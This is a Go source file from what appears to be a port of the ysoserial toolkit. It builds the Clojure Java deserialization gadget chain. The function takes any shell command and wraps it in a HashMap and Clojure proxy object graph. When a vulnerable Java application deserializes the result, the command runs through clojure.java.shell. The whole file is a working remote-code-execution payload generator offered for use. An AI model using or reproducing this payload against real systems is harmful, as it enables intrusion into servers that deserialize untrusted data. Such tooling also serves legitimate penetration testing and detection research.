package ysoserial

func Clojure(cmd string) []byte {
	return ClassObject{
		name:             "java.util.HashMap",
		serialVersionUID: 362498820763181265,
		classDescFlags:   SC_WRITE_METHOD | SC_SERIALIZABLE,
		fields: []Field{
			{Float, "loadFactor", 0.75},
			{Integer, "threshold", 12},
		},
		objectAnnotations: interfaces(
			blockData{0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x01},
			ClassObject{
				name:             "clojure.inspector.proxy$javax.swing.table.AbstractTableModel$ff19274a",
				serialVersionUID: 8247455095412247877,
				classDescFlags:   SC_SERIALIZABLE,
				fields: []Field{
					{"Lclojure/lang/IPersistentMap;", "__clojureFnMap", ClassObject{
						name:             "clojure.lang.PersistentArrayMap",
						serialVersionUID: -2074065891090893601,
						classDescFlags:   SC_SERIALIZABLE,
						fields: []Field{
							{Object, "_meta", nil},
							{"[Ljava/lang/Object;", "array", ArrayObject{
								name:             "[Ljava.lang.Object;",
								serialVersionUID: -8012369246846506644,
								classDescFlags:   SC_SERIALIZABLE,
								values: interfaces(
									ArrayObject{
										name: "hashCode",
									},
									ClassObject{
										name:             "clojure.core$comp$fn__4727",
										serialVersionUID: -2527007022734241607,
										classDescFlags:   SC_SERIALIZABLE,
										fields: []Field{
											{"Ljava/lang/Object;", "f", ClassObject{
												name:              "clojure.main$eval_opt",
												serialVersionUID:  -859722920392072154,
												classDescFlags:    SC_SERIALIZABLE,
												objectAnnotations: interfaces(),
												super:             nil,
											}},
											{Object, "g", ClassObject{
												name:             "clojure.core$constantly$fn__4614",
												serialVersionUID: 6189174895010690260,
												classDescFlags:   SC_SERIALIZABLE,
												fields: []Field{
													{Integer, "x", `(use '[clojure.java.shell :only [sh]]) (sh "` + cmd + `")(println "nu1r")`},
												},
												objectAnnotations: interfaces(),
												super:             nil,
											}},
										},
										objectAnnotations: interfaces(),
										super: &ClassObject{
											name:              "clojure.lang.RestFn",
											serialVersionUID:  -4319097849151802009,
											classDescFlags:    SC_SERIALIZABLE,
											fields:            []Field{},
											objectAnnotations: interfaces(),
											super: &ClassObject{
												name:             "clojure.lang.AFunction",
												serialVersionUID: 4469383498184457675,
												classDescFlags:   SC_SERIALIZABLE,
												fields: []Field{
													{"Lclojure/lang/MethodImplCache;", "__methodImplCache", nil},
												},
												objectAnnotations: interfaces(),
												super:             nil,
											},
										},
									},
								),
							}},
						},
						objectAnnotations: interfaces(),
						super: &ClassObject{
							name:             "clojure.lang.APersistentMap",
							serialVersionUID: 6736310834519110267,
							classDescFlags:   SC_SERIALIZABLE,
							fields: []Field{
								{Integer, "_hash", ""},
								{Integer, "_hasheq", ""},
							},
							objectAnnotations: interfaces(),
							super:             nil,
						},
					}},
				},
				objectAnnotations: interfaces(),
				super: &ClassObject{
					name:             "javax.swing.table.AbstractTableModel",
					serialVersionUID: 8271963769266110398,
					classDescFlags:   SC_SERIALIZABLE,
					fields: []Field{
						{"Ljavax/swing/event/EventListenerList;", "listenerList", ""},
					},
					objectAnnotations: interfaces(),
					super:             nil,
				},
			},
		),
		super: nil,
	}.SerializeWithMagicHeader()
}
